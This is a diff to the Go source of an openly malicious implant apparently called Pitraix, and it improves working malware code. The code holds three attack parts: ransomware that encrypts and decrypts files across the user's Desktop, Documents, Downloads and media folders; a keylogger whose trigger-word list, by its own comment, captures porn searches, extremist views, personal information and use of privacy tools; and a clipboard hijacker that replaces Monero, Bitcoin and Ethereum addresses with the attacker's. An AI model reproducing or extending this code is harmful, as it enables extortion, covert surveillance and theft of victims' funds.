@@ -68,12 +68,26 @@ const (
 	
 
 	// DO NOT CHANGE THIS MANUALLY, RUN OPER
-	raw_OPEncryptionKeyPEM = `RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`
+	raw_OPEncryptionKeyPEM = `-----BEGIN RSA PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzsYbFhphPuWMqmrYeikC
+4XcF8BM7NjipzPHYUkL9brN3Pf/7P/80TWqKksd0fRuUnXpVEu4Lb3ZpZY8hf9MW
+vFqSTF4diJX2u08w/5By44kWdw/SnLkowgeKvE2sYBBNfyxpWYOOGDY53xH9IokD
+xwsevtmgQd0ryk69iXbV0NCG4p3gIWUjXq+dI3b6JC8RQPMiGzeKhz1W2QEBS4yH
+b87kNLgzH0RuveWx72LJv1DRIP0xQTrzmo9SS+tZBhN57FVJ5erInzT8uE7py8Ks
+RrREkLN6uuSsMeyy9cBPwaqdY2lcW3G0RIA43e32YjRWCHXaGhr5IpSClXfbZunJ
+79sqRyfVU1Iqo8twoqgLbKP0rmFZ2q5o3t+R1kmxmX+W8da6Tw3xgp6T47rIFTqO
+7QHvuABkadubH3BATkBvGDHyvW/I0HdeDhaua6AGuw+Gl2uprMGOgEiCvjgu/mYS
+aa+az0+5BLTXid+wZzZH44dCkf0xcVvXAjZkV4Yr9L04wZtJAXAY2xNyo1S3QJd6
+Kx7xt7Uxab86itr9gQXMXwgWVvV31sWK4bX5kE2v56vnIELoF1Z0tPeK4fvVdml0
+CecR6tgd0jZigbtzq8D81iQPd1zwy1iltk6gUtHWkQs6GxQo8BnQKULK91oV6kvn
+ddApwmRa5kHkfiyQTnURBbMCAwEAAQ==
+-----END RSA PUBLIC KEY-----`
+	// `RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`
 
 	// raw_OPSigningKeyPEM = `LEAVE THIS EMPTY FOR NOW`
 
 	// DO NOT CHANGE THIS MANUALLY, RUN OPER
-	agentAddress = "SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"
+	agentAddress = "3kme7qfqxntuh3eanbpslxbx5quzn7srsowkhgvr5sct6srr45parlid" // "SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"
 
 
 
@@ -601,15 +615,11 @@ func doInstru(ic, iv string) string {
 	
 	case "notify":
 		ivspl := strings.Split(iv, " ")
-		fmt.Println("wot", ivspl)
 		if len(ivspl) < 2 {
 			out = "Error: iv length is not 2"
-
 		} else {
-			fmt.Println("ok")
-			notif := toast.Notification{AppID: "Pitraix", Title: ivspl[0], Message: ivspl[1],}
+			notif := toast.Notification{AppID: "Pitraix", Title: ivspl[0], Message: iv[len(ivspl[0]) + 1:],}
 			err := notif.Push()
-			fmt.Println("hm", err)
 			if err != nil {
 				out = "Error: " + err.Error()
 			} else {
@@ -695,7 +705,7 @@ func doInstru(ic, iv string) string {
 			fmt.Println("error ransom key:", err)
 			out = "Error:" + err.Error()
 		} else {
-			target_paths := []string{
+			start_paths := []string{
 				mainDrive + "\\" + "Users\\" + username + "\\Desktop",
 				mainDrive + "\\" + "Users\\" + username + "\\Documents",
 				mainDrive + "\\" + "Users\\" + username + "\\Downloads",
@@ -703,7 +713,8 @@ func doInstru(ic, iv string) string {
 				mainDrive + "\\" + "Users\\" + username + "\\Videos",
 				mainDrive + "\\" + "Users\\" + username + "\\Music",
 			}
-			for _, path := range target_paths {
+
+			for _, path := range start_paths {
 				go decFiles(path, key)
 			}
 
@@ -714,6 +725,7 @@ func doInstru(ic, iv string) string {
 		if file_Exists(iv) {
 			setwallpaperFile(iv)
 			out = "Done"
+
 		} else {
 			out = "File does not Exist"
 		}
@@ -726,6 +738,7 @@ func doInstru(ic, iv string) string {
 			} else {
 				out = "Error:" + err.Error()
 			}
+
 		} else {
 			out = "Error: File does not Exist"
 		}
@@ -744,6 +757,7 @@ func doInstru(ic, iv string) string {
 			} else {
 				out = "Error:" + err.Error()
 			}
+			
 		} else {
 			out = "Error: len not 2"
 		}
@@ -773,6 +787,7 @@ func doInstru(ic, iv string) string {
 			} else {
 				out = "Done"
 			}
+			
 		} else {
 			out = "Error: Invalid instruction format: " + iv
 		}
@@ -800,30 +815,36 @@ func beepSound(freq, dur int) error {
 func decFiles(path string, key []byte) {
 	files, err := ioutil.ReadDir(path)
 	if err != nil {
-		fmt.Println("error reading:", err)
+		fmt.Println("error reading directory:", err)
 		// continue
 	}
 	for _, file := range files {
-		if strings.HasSuffix(file.Name(), ".ini") || strings.HasSuffix(file.Name(), ".lnk") {
-			continue
-		}
-		if file.IsDir() {
-			decFiles(path + "\\" + file.Name(), key)
-			continue
-		}
 		fname := file.Name()
-		if (path == mainDrive + "\\" + "Users\\" + username + "\\Desktop") && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
-			os.Remove(path + "\\" + fname)
+
+		if strings.HasSuffix(fname, ".ini") || strings.HasSuffix(fname, ".lnk") {
 			continue
 		}
-		f, err := readFile(path + "\\" + fname)
+
+		if file.IsDir() {
+			decFiles(filepath.Join(path, fname), key)
+			continue
+		}
+
+		if (path == filepath.Join(mainDrive, "Users", username, "Desktop")) && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
+			os.Remove(filepath.Join(path, fname))
+			continue
+		}
+
+		f, err := readFile(filepath.Join(path, fname))
 		if err != nil {
-			fmt.Println("err 2", err)
+			fmt.Println("error reading file:", err)
 			continue
 		}
-		oof := strings.Split(fname, "_")
-		if len(oof) > 1 {
-			nonce, err := hex.DecodeString(strings.Replace(oof[1], filepath.Ext(oof[1]), "", -1))
+
+		fnamesplt := strings.Split(fname, "_")
+
+		if len(fnamesplt) > 1 {
+			nonce, err := hex.DecodeString(strings.Replace(fnamesplt[1], filepath.Ext(fnamesplt[1]), "", -1))
 			if err != nil {
 				fmt.Println("nonce error:", err)
 				continue
@@ -833,8 +854,8 @@ func decFiles(path string, key []byte) {
 				fmt.Println("decryption error:", err)
 				continue
 			}
-			os.Remove(path + "\\" + fname)
-			out, err := os.Create(path + "\\" + oof[0]) // + filepath.Ext(fname))
+			os.Remove(filepath.Join(path, fname))
+			out, err := os.Create(filepath.Join(path, fnamesplt[0])) // + filepath.Ext(fname))
 			out.Write(decypher)
 			if err != nil {
 				fmt.Println("error creating encrypted file:", err)
@@ -842,42 +863,47 @@ func decFiles(path string, key []byte) {
 			}
 			out.Close()	
 		}
+
 	}
 }
 
 func encFiles(path string, key []byte) {
 	files, err := ioutil.ReadDir(path)
 	if err != nil {
-		fmt.Println("err 1", err)
+		fmt.Println("error reading directory:", err)
 		// continue
 	}
 	for _, file := range files {
-		if strings.HasSuffix(file.Name(), ".ini") || strings.HasSuffix(file.Name(), ".lnk") {
-			continue
-		}
-		if file.IsDir() {
-			encFiles(path + "\\" + file.Name(), key)
-			continue
-		}
 		fname := file.Name()
 
-		if (path == mainDrive + "\\" + "Users\\" + username + "\\Desktop") && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
+		if strings.HasSuffix(fname, ".ini") || strings.HasSuffix(fname, ".lnk") {
 			continue
 		}
 
-		f, err := readFile(path + "\\" + fname)
-		if err != nil {
-			fmt.Println("err 2", err)
+		if file.IsDir() {
+			encFiles(filepath.Join(path, fname), key)
 			continue
 		}
-		os.Remove(path + "\\" + fname)
+
+		if (path == filepath.Join(mainDrive, "Users", username, "Desktop")) && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
+			continue
+		}
+
+		f, err := readFile(filepath.Join(path, fname))
+		if err != nil {
+			fmt.Println("error reading file:", err)
+			continue
+		}
+
+		os.Remove(filepath.Join(path, fname))
+
 		// f = append([]byte(fname + "|"))
 		cypher, nonce, _ := encrypt_AES(f, key)
 
-		out, err := os.Create(path + "\\" + fname + "_" + hex.EncodeToString(nonce) + filepath.Ext(fname))
+		out, err := os.Create(filepath.Join(path, fname + "_" + hex.EncodeToString(nonce) + filepath.Ext(fname)))
 		out.Write(cypher)
 		if err != nil {
-			fmt.Println("err 3", err)
+			fmt.Println("error creating file:", err)
 			continue
 		}
 		out.Close()	
@@ -1222,34 +1248,100 @@ func main() {
 	klogChn1 := make(chan string)
 
 	go func(klogChn1 chan string) { // Key logger parser
-		eventsIndicators := []string{ // words here don't need to be correct this checks start only
-			"fuck",
-			"shit",
-			"sex",
-			"dick",
-			"cock",
-			"pussy",
-			"ass",
-			"tit",
-			"balls",
-			"young",
-			"kid",
-			"teen",
-			"child",
+		/* 
+			Some words of this list are mispelled on purpose, this is not a mistake and logger will still pick the correct sentence
+			This list will only keylog "interesting" things like porn searches, extremeist views and personal information
+		*/
+		eventsIndicators := []string{
+			"going to",
+			"will",
+			"troll",
+			"vpn",
+			"proxy",
+			"password",
+			"hid",
+			"tor",
+			"hack",
+			"crack",
+			"engineer",
+			"spam",
+			"log",
+			"i2p",
+			"freenet",
+			"whonix",
+			"qube",
+			"tails",
+			"usb",
+			"dox",
+			"opsec",
+			"info",
+			"sell",
+			"buy",
+			"ubuntu",
+			"debian",
+			"manjaro",
+			"arch",
+			"fedora",
+			"harden",
+			"bot",
+			"mal",
+			"data",
+			"dev",
+			"psyop",
+			"op",
+			"vacation",
+			"program",
+			"python",
+			"c++",
+			"c#",
+			"binary",
+			"java",
+			"javascript",
+			"golang",
+			"html",
+			"css",
+			"cypher",
+			"cipher",
+			"zero",
+			"0",
+			"1",
+			"2",
+			"3",
+			"4",
+			"5",
+			"6",
+			"7",
+			"8",
+			"9",
+			"exploit",
+			"meta",
+			"fuc",
+			"shi",
+			"se",
+			"dic",
+			"coc",
+			"pus",
+			"as",
+			"ti",
+			"bal",
+			"youn",
+			"ki",
+			"tee",
+			"chil",
+			"fullz",
 			"cp",
-			"loli",
-			"porn",
+			"por",
 			"x",
 			"tra",
 			"gay",
 			"lgb",
 			"blow",
-			"rape",
+			"rap",
 			"stalk",
 			"horny",
 			"naked",
-			"hardcore",
-			"softcore",
+			"hard",
+			"soft",
 			"bre",
 			"straight",
 			"girl",
@@ -1267,12 +1359,12 @@ func main() {
 			"aunt",
 			"cousin",
 			"al qaeda",
-			"isis",
+			"isi",
 			"islamic",
-			"jihad",
-			"muslim state",
-			"nazi",
-			"hitler",
+			"ji",
+			"muslim",
+			"naz",
+			"hitl",
 			"ww1",
 			"ww2",
 			"ww3",
@@ -1282,15 +1374,14 @@ func main() {
 			"would",
 			"white",
 			"black",
-			"jew",
+			"je",
 			"nig",
 			"neg",
 			"war",
 			"revenge",
 			"grudge",
 			"blood",
-			"fag",
-			"homemade",
+			"fa",
 			"hate",
 			"iraq",
 			"syria",
@@ -1299,8 +1390,8 @@ func main() {
 			"drone",
 			"nuclear",
 			"nuke",
-			"bomb",
-			"explosive",
+			"bom",
+			"explos",
 			"sho",
 			"guns",
 			"glock",
@@ -1322,61 +1413,6 @@ func main() {
 			"betray",
 			"how to",
 			"manual",
-			"going to",
-			"will",
-			"troll",
-			"vpn",
-			"proxy",
-			"password",
-			"hid",
-			"tor",
-			"the onion router",
-			"hack",
-			"crack",
-			"engineer",
-			"spam",
-			"fullz",
-			"log",
-			"i2p",
-			"freenet",
-			"whonix",
-			"qube",
-			"tails",
-			"usb",
-			"dox",
-			"opsec",
-			"info",
-			"sell",
-			"buy",
-			"ubuntu",
-			"debian",
-			"manjaro",
-			"arch",
-			"fedora",
-			"harden",
-			"bot",
-			"malware",
-			"data",
-			"dev",
-			"psyop",
-			"op",
-			"vacation",
-			"program",
-			"python",
-			"c++",
-			"c#",
-			"binary",
-			"java",
-			"javascript",
-			"golang",
-			"html",
-			"css",
-			"cypher",
-			"cipher",
-			"zero",
-			"0",
-			"exploit",
-			"metasploit",
 			"facebook",
 			"twitter",
 			"link",
@@ -1441,11 +1477,10 @@ func main() {
 			"firefox",
 			"chrome",
 			"nsa",
-			"national security",
+			"national",
 			"agency",
 			"fbi",
 			"addict",
-			"federal",
 			"fed",
 			"cia",
 			"mossad",
@@ -1590,8 +1625,9 @@ func main() {
 			"euro",
 			"free",
 			"holy",
-			"omg",
 		}
+
+
 		for sentence := range klogChn1 {
 			words := strings.Fields(sentence)
 			match := false
@@ -1905,31 +1941,31 @@ func main() {
 							if moneroAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
 								fmt.Println("monero address detected:", text)
 								clipboard.WriteAll(moneroAddr)
-								fmt.Println("done switched")
 
-							} else if bitcoinSegwitAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
+							} else if bitcoinSegwitAddr != "OPTIONAL" && len(text) == 42 && IsLower(text) {
 								fmt.Println("bitcoin segwit address detected:", text)
 								clipboard.WriteAll(bitcoinSegwitAddr)
-								fmt.Println("done switched")
 
-							} else if bitcoinLegacyAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
+							} else if bitcoinLegacyAddr != "OPTIONAL" && len(text) == 34 && !IsUpper(text) && !IsLower(text) {
 								fmt.Println("bitcoin legacy address detected:", text)
 								clipboard.WriteAll(bitcoinLegacyAddr)
-								fmt.Println("done switched")
-							
-							} else if ethereumAddr != "OPTIONAL" && len(text) == 95 && !IsUpper(text) && !IsLower(text) {
+
+							} else if ethereumAddr != "OPTIONAL" && strings.HasPrefix(text, "0x") && len(text) == 40 && !IsUpper(text) && !IsLower(text) {
 								fmt.Println("ethereum address detected:", text)
 								clipboard.WriteAll(ethereumAddr)
-								fmt.Println("done switched")
+
 							}
 
 							fmt.Println("clipboard:", text)
 							tmpKeylog += text
 							ctrlPressed = false
+
 						} else if capsLock {
 							tmpKeylog += string(key)
+
 						} else {
 							tmpKeylog += strings.ToLower(string(key))
+
 						}
 					}
 				}
